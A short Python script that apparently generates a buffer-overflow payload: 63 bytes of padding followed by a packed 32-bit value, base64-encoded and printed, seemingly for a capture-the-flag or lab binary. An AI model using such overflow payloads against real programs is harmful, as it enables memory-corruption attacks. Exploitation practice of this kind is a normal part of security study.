
import sys
import struct
import base64

buf = b'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU'
buf += struct.pack('<I', 3218847175)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
